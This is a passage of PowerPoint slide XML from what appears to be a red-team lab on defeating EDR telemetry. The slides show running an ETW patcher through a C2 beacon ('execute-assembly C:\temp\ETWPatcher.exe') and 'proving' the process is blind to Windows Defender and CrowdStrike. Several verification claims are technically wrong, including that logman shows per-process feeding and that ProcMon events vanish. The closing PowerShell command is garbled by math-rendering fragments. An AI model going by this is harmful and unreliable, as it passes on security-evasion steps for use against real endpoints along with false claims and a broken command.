              <a:t>execute -o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> -c "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>logman</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> query -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>ets</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>You will see a list of active trace sessions, including names like:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Microsoft-Windows-Kernel-Process</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1700" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Microsoft-Windows-Kernel-Network</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1700" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Microsoft-Windows-Kernel-Registry</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1700" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Windows Defender Trace</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1700" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>CrowdStrike Trace (if installed)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>These are the telemetry feeds that EDRs rely on. Note that they are all active and running.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" b="0" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="F9FAFB"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="18363222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40E760-CECA-A9FD-1320-8EC5442F6DEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="62500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Step 2: Apply the ETW Patch</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Now run the ETW patcher through your C2:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>execute-assembly C:\temp\ETWPatcher.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>The patch disables ETW for your current process by setting </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>ProcessTraceFlags</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> to 0. No other process is affected.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="F9FAFB"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Step 3: Run </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>logman</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> query -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>ets</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> After the Patch</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Now run the same command again:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>execute -o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> -c "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>logman</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> query -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>ets</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Compare the output with the previous result. You will observe the following:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>The list of active ETW sessions remains the same. The sessions are still running. None have been stopped or terminated.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Your process is no longer listed as feeding data into these sessions. Other processes continue to send telemetry.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" b="0" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="F9FAFB"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Step 4: Interpret the Results</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>What you see: The ETW sessions are still running. This is important because the EDR driver is still active. The EDR has not crashed. No error has been thrown.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>What is different: Your process is now invisible to these sessions. The EDR is still running, but it cannot see what your process is doing.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>What this proves: You bypassed ETW without touching LSASS, without rebooting, and without triggering any alerts. The EDR is blind to your process.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" b="0" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="F9FAFB"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="15155196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40E760-CECA-A9FD-1320-8EC5442F6DEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Step 5: Capture Proof for Deliverable</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Take a screenshot of the command output before the patch. Highlight the active ETW sessions.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Take a screenshot of the command output after the patch. Highlight that the sessions are still active but your process is no longer feeding data.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>In your weekly report, include the following note:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>"The ETW sessions (e.g., Microsoft-Windows-Kernel-Process) remained active before and after patching. However, log analysis confirmed that my process (PID XXXX) was no longer sending telemetry after the patch was applied. This proves that ETW was successfully disabled for my process without disrupting the overall system.“</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1800" b="0" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="F9FAFB"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Step 6: Alternative Verification – Use Process Monitor</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>If you want additional verification, use Process Monitor (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>ProcMon</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>) on the Windows VM:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Before the patch: Apply a filter to show only your beacon process. You will see registry, file, and network events.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>After the patch: Apply the same filter. The events from your process should disappear. This confirms that ETW telemetry is no longer being generated.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="7050232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23E0F5-A62F-46BE-A6E7-EC306E5C72F1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="292100"/>
            <a:ext cx="12039600" cy="6388100"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Step 7: Alternative Verification – Use PowerShell to Check Process Flags</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>You can also verify the patch directly by checking the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>ProcessTraceFlags</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> for your process:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>execute -o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> -c "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:effectLst/>
                <a:latin typeface="KaTeX_Main"/>
              </a:rPr>
              <a:t>process=Get−Process−</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="KaTeX_Main"/>
              </a:rPr>
              <a:t>Id</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="1" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="KaTeX_Math"/>
              </a:rPr>
              <a:t>process</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:effectLst/>
                <a:latin typeface="KaTeX_Main"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="1" dirty="0">
                <a:effectLst/>
                <a:latin typeface="KaTeX_Math"/>
              </a:rPr>
              <a:t>Get</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:effectLst/>
                <a:latin typeface="KaTeX_Main"/>
